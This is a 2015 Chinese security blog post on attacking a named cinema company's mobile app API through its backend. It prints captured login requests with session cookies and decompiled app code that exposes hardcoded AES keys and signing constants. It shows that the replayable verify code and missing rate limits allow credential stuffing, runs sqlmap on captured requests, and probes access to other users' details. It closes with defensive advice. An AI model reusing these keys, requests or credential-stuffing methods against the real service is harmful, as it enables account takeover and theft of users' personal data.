<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>通过IOS Android App获取APP后端数据 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2015-10-21T02:13:20.000Z" itemprop="datePublished">
          2015-10-21
      </time>
    
    
    | 
    <a href='/tag/xss/'>xss</a>,
    
    <a href='/tag/SQL注入/'>SQL注入</a>,
    
    <a href='/tag/移动APP漏洞/'>移动APP漏洞</a>,
    
    <a href='/tag/OWASP/'>OWASP</a>
    
    
</span>
    <h1 class="post-title">通过IOS Android App获取APP后端数据</h1>
    <section class="post-content">
      <p>本文原创作者：bt0sea</p>  <p><a href="http://image.3001.net/images/20151020/14453344712097.jpg!small" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="创意手机app汇总.jpg" border="0" alt="clip_image001" src="http://img.cker.in/IOSAndroidAppAPP_1001C/clip_image001.jpg" width="694" height="464"></a></p>  <p><b>0</b><b>×00、业务需求</b></p>  <p><b>移动应用产业以爆炸性的速度呈指数增长，但移动应用的安全问题落后于应用的发展速度。由于黑客事件变得越来越公开，对企业的影响比以往任何时候都更大。黑客渗透获取用户敏感数据后，出于商业目的销售，或者公开。所以，在移动APP端对企业数据的保护尤为重要。</b></p>  <p>P2P网站、金融等相关的网站、APP保存着用户的身份信息（真实姓名、身份证号、手机号、征信证明、银行流水等）。目前趋势是<a href="http://ha.cker.in/tag/移动APP漏洞" target="_blank">移动APP漏洞</a>层出不穷，今天的移动安全相当于十年前web服务器安全的级别。基本上可以得出这样的结论：根据权威机构评估，平均每一个移动APP应用大约有3.5个安全漏洞，Apk 就是open source code代名词。</p>  <p>但是，单纯研究Mobile APP安全性问题，无法利用高危，获得服务器端的数据。所以，在分析移动APP漏洞的同时，要重点分析连接移动APP的RESTful API Web service。为什么要提RESTful API Web service呢？普通web架构+JSON不就成了么？经过分析大部分有价值数据的网站都是使用RESTful API Web service。这是热需求。</p>  <p>咱们先看看哪些大咖用这种设计架构，github/fackbook等。不了解RESTful API Web Service的同学请参考：</p>  <p><a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2014/05/restful_api.html</a></p>  <p><b>0</b><b>×01、研究手段</b></p>  <p><b>一、破解思路：</b></p>  <p>其实重点突破RESTful API Web Service 还是通过iOS/Android App。由于很多高大上的网站为了安全性，把Web网站和移动APP隔离，发现使用http(s)://api(OpenApi).xxx.com/login/v1?phone=13811110000&amp;sgin=022BEC9EE1B935B50D1193A07A3AD7B2。都是通过移动APP抓到的包。所以，我们先看看移动端安全风险主要有哪些，我们如何下手，其实<a href="http://ha.cker.in/tag/OWASP" target="_blank">OWASP</a> Mobile Top 10 Risks给我们指引了方向：</p>  <p>M1: 不安全的服务器端访问控制</p>  <p>M2: 不安全的数据存储</p>  <p>M3: 传输层保护不足</p>  <p>M4: 非预期的数据泄露</p>  <p>M5: 脆弱的认证和授权</p>  <p>M6: 已知的弱加密算法</p>  <p>M7: 客户端注入</p>  <p>M8: 通过不被信任的输入改变安全设定</p>  <p>M9: 会话处理不当</p>  <p>M10: 缺乏二进制保护</p>  <p>虽然说官网总结的很好，但是对于服务器端渗透从字面上只有M1。但是个人觉得需要配合APP破解才能达到最佳效果。那么，具体应该怎么操作呢？</p>  <p><b>M1</b><b>：不安全的服务器端访问控制</b></p>  <p>(1)通过android移动APP程序攻击服务器端业务逻辑。</p>  <p>(2)验证服务器端对输入校验。</p>  <p>(3)通用 <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a> <a href="http://ha.cker.in/tag/xss" target="_blank">XSS</a>跨站脚本，不安全的认证检查。</p>  <p>(4)通过代理方式操纵伪造数据提交。</p>  <p>当然要配合M2相关内容。</p>  <p><b>M2</b><b>：不安全的数据存储</b></p>  <p>(1)敏感信息：用户名、密码、加密key、信用卡信息、session识别码、token等。</p>  <p>(2)个人信息：手机号、家庭住址、电子邮件、位置信息等。</p>  <p>(3)还有一些可能包含敏感信息的文件存储：SQLite databases 、Log Files 、XML Data Stores or Manifest Files 、Binary data stores 、SD Card、Cloud</p>  <p><b>二、具体攻击方法</b></p><br><a id="more"></a><br><p><b></b></p>  <p><b>2.1 </b><b>使用安卓手机应用程序攻击服务器业务逻辑</b></p>  <p>通过上述分析，可以发现，如果想获取服务器端数据库的数据，主要是集中在对Web平台的安全检测，同时，结合这期的主题RESTful API Web Service，渗透测试重点主要表现在：</p>  <p>(1)、对手机APP客户端做身份认证（Authentication）</p>  <p>(2)、对手机APP身份认证之后的授权（Authorization）</p>  <p>(3)、对手机APP和服务器端传输的数据加密级别判定</p>  <p>首先，我们要了解目前的针对RESTful API Web Service防护的技术手段。</p>  <p><b>方法论研究</b></p>  <p>1、对手机APP客户端做身份认证</p>  <p>1.1、在APP请求中增加签名参数</p>  <p>1.2、http auth （HTTP Basic/HTTP Digest）身份认证机制，这个一般都由安全架构来承担（例如Spring Security）</p>  <p>1.3、OAuth 1/2协议做身份认证（一般都是第三方接入时使用，例如：weibo、微信等）</p>  <p>攻击思路：</p>  <p>寻找Android App存储在本地token信息，比如说在database、s_Prefs;等地方。</p>  <p>破解Android App的加固，寻找和服务器通讯URL签名算法。知道生成算法，就可以伪造请求了。。。</p>  <p>测试用例：撞库分析。。。（分析后可以通过已经泄露的数据库，碰撞测试）：账号和密码产生机制，以及签名产生机制。</p>  <p><b>第一步：首先观察不同两次登录 URL是否存在URL签名。</b></p>  <p>POST <a href="http://wdapi.wandafilm.com/filmserver/user/login" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/user/login</a> HTTP/1.1</p>  <p>Host: wdapi.wandafilm.com</p>  <p>Connection: close</p>  <p>Accept-Encoding: gzip</p>  <p>Content-Type: application/x-www-form-urlencoded; charset=utf-8</p>  <p>Content-Length: 312</p>  <p>Connection: close</p>  <p>User-Agent: 万达电影 3.9.0 rv:95475 (iPhone; iPhone OS 8.4.1; zh_CN)</p>  <p>clientversion=30900&amp;clientid=1&amp;verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0SpI2Olm3oacqAG%252BxXBrCAm49QWQqztOFLvu5MuecuPzg%253D%253D&amp;password=f73177f13486f55bcd8bea88d1610f58&amp;mobile=186183xx220&amp;imei=&amp;version=2&amp;clienttype=1</p>  <p>POST <a href="http://wdapi.wandafilm.com/filmserver/user/login" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/user/login</a> HTTP/1.1</p>  <p>Host: wdapi.wandafilm.com</p>  <p>Connection: close</p>  <p>Accept-Encoding: gzip</p>  <p>Content-Type: application/x-www-form-urlencoded; charset=utf-8</p>  <p>Content-Length: 308</p>  <p>Connection: close</p>  <p>User-Agent: 万达电影 3.9.0 rv:95475 (iPhone; iPhone OS 8.4.1; zh_CN)</p>  <p>clientversion=30900&amp;clientid=1&amp;verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0TyLPqEc9hZzGdykXLBNTChe8Cq3c6zqbo2I03zxSZDbA%253D%253D&amp;password=f73177f13486f55bcd8bea88d1610f58&amp;mobile=186183xx220&amp;imei=&amp;version=2&amp;clienttype=1</p>  <p>发现verifycode没有改变。</p>  <p><b>第二步：分析登录各个参数的含义，同时参考破解APK文件。</b></p>  <p>POST <a href="http://wdapi.wandafilm.com/filmserver/user/login" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/user/login</a> HTTP/1.1</p>  <p>Host: wdapi.wandafilm.com</p>  <p>Connection: close</p>  <p>Accept-Encoding: gzip</p>  <p>Content-Type: application/x-www-form-urlencoded; charset=utf-8</p>  <p>Content-Length: 316</p>  <p>Connection: close</p>  <p>Cookie: jsessionid|JSESSIONID=4151ab5036290f18ef079cf0f0e43281</p>  <p>User-Agent: 万达电影 3.9.0 rv:95475 (iPhone; iPhone OS 8.4.1; zh_CN)</p>  <p>clientversion=30900&amp;</p>  <p>clientid=1&amp;</p>  <p>verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0SrYk%252FpfqrZZAbA%252BwmJphBLFeaxqAU3tAC5Du9C9W4Yyw%253D%253D&amp;</p>  <p>password=f73177f13486f55bcd8bea88d1610f58&amp;</p>  <p>mobile=186183xx220&amp;</p>  <p>imei=&amp;</p>  <p>version=2&amp;</p>  <p>clienttype=1</p>  <p>apk破解后找到登陆处理函数。</p>  <p>public UserAPILogin(String paramString1, String paramString2, String paramString3, UserModel paramUserModel)</p>  <p>{</p>  <p>&#160;&#160;&#160; super(&quot;/user/login&quot;);</p>  <p>this.mMobile = paramString1;</p>  <p>this.mPassWord = Md5Utils.md5(paramString2);</p>  <p>this.mUserModel = paramUserModel;</p>  <p>this.mTerminal = paramString3;</p>  <p>}</p>  <p>查看源代码后，发现没有加salt，当然你可以使用MD5工具加密对比，但是绝大部分的程序是加salt的。</p>  <p>public static String md5(String paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160; sMd5MessageDigest.reset();</p>  <p>&#160;&#160;&#160; sMd5MessageDigest.update(paramString.getBytes());</p>  <p>&#160;&#160;&#160; paramString = sMd5MessageDigest.digest();</p>  <p>&#160;&#160;&#160; sStringBuilder.setLength(0);</p>  <p>int i = 0;</p>  <p>for (;;)</p>  <p>{</p>  <p>if (i &gt;= paramString.length) {</p>  <p>return sStringBuilder.toString();</p>  <p>}</p>  <p>int j = paramString[i] &amp; 0xFF;</p>  <p>if (j &lt; 16) {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; sStringBuilder.append(&amp;#039;0&amp;#039;);</p>  <p>}</p>  <p>&#160;&#160;&#160;&#160;&#160; sStringBuilder.append(Integer.toHexString(j));</p>  <p>&#160;&#160;&#160;&#160;&#160; i += 1;</p>  <p>}</p>  <p>}</p>  <p>在源代码中搜索verifycode、clientversion、clientid等关键字，定位到WandafilmServerAPI类中的描述：</p>  <p>public String getUrl()</p>  <p>{</p>  <p>String str = super.getUrl();</p>  <p>StringBuilder localStringBuilder = new StringBuilder();</p>  <p>&#160;&#160;&#160; localStringBuilder.append(str);</p>  <p>if (!str.contains(&quot;?&quot;)) {</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(&quot;?&quot;);</p>  <p>}</p>  <p>for (;;)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(&quot;clientid=&quot;);</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(Integer.toString(NetConstants.CLIENT_ID));</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(&quot;&amp;clienttype=&quot;);</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(Integer.toString(2));</p>  <p>&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(&quot;&amp;verifycode=&quot;);</p>  <p>&#160;&#160;&#160;&#160;&#160; str = getVerifyCodeAes(NetConstants.VERIFY_CODE + System.currentTimeMillis());</p>  <p>if (!TextUtils.isEmpty(str)) {}</p>  <p>try</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(URLEncoder.encode(str.trim(), &quot;utf-8&quot;));</p>  <p>return localStringBuilder.toString();</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; localStringBuilder.append(&quot;&amp;&quot;);</p>  <p>}</p>  <p>catch (UnsupportedEncodingException localUnsupportedEncodingException)</p>  <p>{</p>  <p>for (;;)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; localUnsupportedEncodingException.printStackTrace();</p>  <p>}</p>  <p>}</p>  <p>}</p>  <p>}</p>  <p>然后定位getVerifyCodeAes。</p>  <p>private String getVerifyCodeAes(String paramString)</p>  <p>{</p>  <p>if (mAes == null) {}</p>  <p>try</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160; mAes = new EncryptionAES(NetConstants.AES_KEY);</p>  <p>}</p>  <p>catch (NoSuchAlgorithmException localNoSuchAlgorithmException)</p>  <p>{</p>  <p>for (;;)</p>  <p>{</p>  <p>try</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString = mAes.encrypt(paramString.getBytes());</p>  <p>return paramString;</p>  <p>}</p>  <p>catch (InvalidKeyException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>return null;</p>  <p>}</p>  <p>catch (NoSuchAlgorithmException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>continue;</p>  <p>}</p>  <p>catch (NoSuchPaddingException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>continue;</p>  <p>}</p>  <p>catch (InvalidAlgorithmParameterException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>continue;</p>  <p>}</p>  <p>catch (IllegalBlockSizeException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>continue;</p>  <p>}</p>  <p>catch (BadPaddingException paramString)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; paramString.printStackTrace();</p>  <p>continue;</p>  <p>}</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; localNoSuchAlgorithmException = localNoSuchAlgorithmException;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; localNoSuchAlgorithmException.printStackTrace();</p>  <p>}</p>  <p>}</p>  <p>catch (InvalidKeySpecException localInvalidKeySpecException)</p>  <p>{</p>  <p>for (;;)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; localInvalidKeySpecException.printStackTrace();</p>  <p>}</p>  <p>}</p>  <p>}</p>  <p>static</p>  <p>{</p>  <p>int i;</p>  <p>if (CURRENT_APP_SOURCE == AppSource.CINEMA)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160; i = 1;</p>  <p>&#160;&#160;&#160;&#160;&#160; CLIENT_ID = i;</p>  <p>if (CURRENT_APP_SOURCE != AppSource.CINEMA) {</p>  <p>break label89;</p>  <p>}</p>  <p>&#160;&#160;&#160;&#160;&#160; str = &quot;lhdV+wj177YyjirsxeikaNestM/YafgOxrpiGbMVxzvefarFNbQfGHXauqmTIJk+upexqehjv8xK+mlx2SbnDg==&quot;;</p>  <p>&#160;&#160;&#160;&#160;&#160; label34:</p>  <p>&#160;&#160;&#160;&#160;&#160; VERIFY_CODE = str;</p>  <p>if (CURRENT_APP_SOURCE != AppSource.CINEMA) {</p>  <p>break label96;</p>  <p>}</p>  <p>}</p>  <p>&#160;&#160;&#160; label89:</p>  <p>&#160;&#160;&#160; label96:</p>  <p>for (String str = &quot;wandayuanxian100008&quot;;; str = &quot;wanhui20008qweasd&quot;)</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160; AES_KEY = str;</p>  <p>&#160;&#160;&#160;&#160;&#160; FACE_PACKAGE_LOCAL_PATH = Environment.getExternalStorageDirectory().getAbsolutePath() + &quot;/WandaFacePackage&quot;;</p>  <p>return;</p>  <p>&#160;&#160;&#160;&#160;&#160; i = 2;</p>  <p>break;</p>  <p>&#160;&#160;&#160;&#160;&#160; str = &quot;vcj3smUdw7H47eqDg++qQUR4P52JMZolcamSazRZAQP6h6H9C4vusOkCdt/a15ofuLwGgt+lsgCyzD+ph1WyNg==&quot;;</p>  <p>break label34;</p>  <p>}</p>  <p>}</p>  <p>private byte[] encrypt(SecretKey paramSecretKey, IvParameterSpec paramIvParameterSpec, byte[] paramArrayOfByte)</p>  <p>&#160;&#160;&#160; throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException</p>  <p>{</p>  <p>Cipher localCipher = Cipher.getInstance(&quot;AES/CBC/PKCS7Padding&quot;);</p>  <p>&#160;&#160;&#160; localCipher.init(1, paramSecretKey, paramIvParameterSpec);</p>  <p>return localCipher.doFinal(paramArrayOfByte);</p>  <p>}</p>  <p>System.currentTimeMillis()产生一个当前的毫秒，这个毫秒其实就是自1970年1月1日0时起的毫秒数</p>  <p>没有对手机唯一性的判断，那么，导致verifycode每次登陆都一样，那么，完全可以撞库。</p>  <p><a href="http://image.3001.net/images/20151020/14453243525793.png!small" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="1.png" border="0" alt="clip_image002" src="http://img.cker.in/IOSAndroidAppAPP_1001C/clip_image002.jpg" width="694" height="348"></a></p>  <p>设置8次提交。JSON数据返回值都一样（{&quot;msg&quot;:&quot;手机号或密码错误!&quot;,&quot;status&quot;:13007}），那证明，服务器端java应用程序没有次数限制判断。</p>  <p>那么，具体怎么撞库，请参考：</p>  <p><a href="http://mp.weixin.qq.com/s?__biz=MzA4MTA1MDIwMQ==&amp;mid=207971286&amp;idx=1&amp;sn=adb5c7bffabee975fd76f4f0b71a815d#rd" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzA4MTA1MDIwMQ==&amp;mid=207971286&amp;idx=1&amp;sn=adb5c7bffabee975fd76f4f0b71a815d#rd</a></p>  <p><b>2.2 </b><b>常见的服务器端漏洞，如SQL注入</b></p>  <p>通过代理方式遍历APP抓取所有的URL连接，然后使用SQLMAP检查：</p>  <p>GET <a href="http://wdapi.wandafilm.com/filmserver/info/popularize?verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0S1UEUY0GOe3b2gBZ6jI19NjRz%252FMbY2H1MJ%252BG%252FUT6LPPg%253D%253D&amp;clientid=1&amp;imei=&amp;clientversion=30900&amp;version=2&amp;clienttype=1" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/info/popularize?verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0S1UEUY0GOe3b2gBZ6jI19NjRz%252FMbY2H1MJ%252BG%252FUT6LPPg%253D%253D&amp;clientid=1&amp;imei=&amp;clientversion=30900&amp;version=2&amp;clienttype=1</a> HTTP/1.1</p>  <p>Host: wdapi.wandafilm.com</p>  <p>Connection: keep-alive</p>  <p>Accept-Encoding: gzip</p>  <p>User-Agent: 万达电影 3.9.0 rv:95475 (iPhone; iPhone OS 8.4.1; zh_CN)</p>  <p>Connection: keep-alive</p>  <p>Cookie: UID=20130211223622356711; SESSIONID=7d4c8c04397e5542e890004d2100f904; jsessionid|JSESSIONID=ecc029e6326c8a7c319c7aa6506c7369</p>  <p>开启kali linux</p>  <p>开启终端：sqlmap –r sqlinj12.txt</p>  <p><a href="http://image.3001.net/images/20151020/14453246553973.png!small" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="2.png" border="0" alt="clip_image003" src="http://img.cker.in/IOSAndroidAppAPP_1001C/clip_image003.jpg" width="694" height="425"></a></p>  <p>提交的时候可以提交User-Agent:等相关参数为移动App提交，如果服务器端有相关的判断，可以绕过。</p>  <p><a href="http://image.3001.net/images/20151020/14453265927810.png!small" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="112.png" border="0" alt="clip_image004" src="http://img.cker.in/IOSAndroidAppAPP_1001C/clip_image004.jpg" width="694" height="458"></a></p>  <p>同时，建议通过wireshark观察一下返回值的情况。</p>  <p><a href="http://image.3001.net/images/20151020/14453264755696.png!small" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="111.png" border="0" alt="clip_image005" src="http://img.cker.in/IOSAndroidAppAPP_1001C/clip_image005.jpg" width="694" height="456"></a></p>  <p>经过测试发现没有sql注入漏洞。</p>  <p><b>2.3 </b><b>服务器端输入验证的缺失</b></p>  <p>是否越权获取其他用户数据。</p>  <p>GET <a href="http://wdapi.wandafilm.com/filmserver/user/userdetail?clientversion=30900&amp;type=1&amp;userid=20130211223622356711&amp;clientid=1&amp;verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0RQz5UQQ8aiPpE15TIQiIOSUIaJWMCXwVDD5lGOpgY6gg%253D%253D&amp;imei=&amp;version=2&amp;clienttype=1" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/user/userdetail?clientversion=30900&amp;type=1&amp;userid=20130211223622356711&amp;clientid=1&amp;verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0RQz5UQQ8aiPpE15TIQiIOSUIaJWMCXwVDD5lGOpgY6gg%253D%253D&amp;imei=&amp;version=2&amp;clienttype=1</a> HTTP/1.1</p>  <p>Host: wdapi.wandafilm.com</p>  <p>Connection: keep-alive</p>  <p>Accept-Encoding: gzip</p>  <p>User-Agent: 万达电影 3.9.0 rv:95475 (iPhone; iPhone OS 8.4.1; zh_CN)</p>  <p>Connection: keep-alive</p>  <p>Cookie: UID=20130211223622356711; SESSIONID=7d4c8c04397e5542e890004d2100f904; jsessionid|JSESSIONID=ecc029e6326c8a7c319c7aa6506c7369</p>  <p><a href="http://wdapi.wandafilm.com/filmserver/user/userdetail?" target="_blank" rel="external">http://wdapi.wandafilm.com/filmserver/user/userdetail?</a></p>  <p>clientversion=30900&amp;</p>  <p>type=1&amp;</p>  <p>userid=20130211223622356711&amp;</p>  <p>clientid=1&amp;</p>  <p>verifycode=26FZaoBW4leyKOPjrsruo%252FidC3w3S8ETmXUfiepYaAa6dwp1rqTh%252FLqFHsVxVnP8okfw%252BZaUOJ0ONHxYgOO2%252BrDmYygAmW874ZEZabzDK0RQz5UQQ8aiPpE15TIQiIOSUIaJWMCXwVDD5lGOpgY6gg%253D%253D&amp;</p>  <p>imei=&amp;</p>  <p>version=2&amp;</p>  <p>clienttype=1</p>  <p>((StringBuffer)localObject5).append(&quot;UserId&quot;);</p>  <p>((StringBuffer)localObject5).append(&quot; =? &quot;);</p>  <p>Object localObject1 = CinemaGlobal.getInst().mUserModel.getUser().getUid();</p>  <p><b>0</b><b>×02、测试结论：</b></p>  <p>（1）不能相信任何用户的输入，服务器端必须做校验。为了防止提交URL篡改。设计URL时：建议使用用户名密码 + https + url签名（url+时间戳+随机字串）链接。服务器返回token：使用约定的AES算法secret key随机</p>  <p>（2）为了防止为重放攻击，请求中增加一次性的Token，或者短时间内有效的Token。需要提取用户手机特征，但是iphone最好不要提取IMEI，因为苹果权限控制，很多时候为失效状态，导致URL签名没有变化。</p>  <p>（3）客户端最好不要存储任何有价值的数据。存储也必须加密。因为很多时候，你无法判断你的APP是否运行在一个被root的手机上。</p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://www.cker.in/1132.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://www.cker.in/1132.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cker.in/1132.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.cker.in/1132.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/1133.seo/">
        ← 针对打印机的APT攻击
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/1131.seo/">
        Redis未授权访问漏洞获取shell，及写shell报错解决办法 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
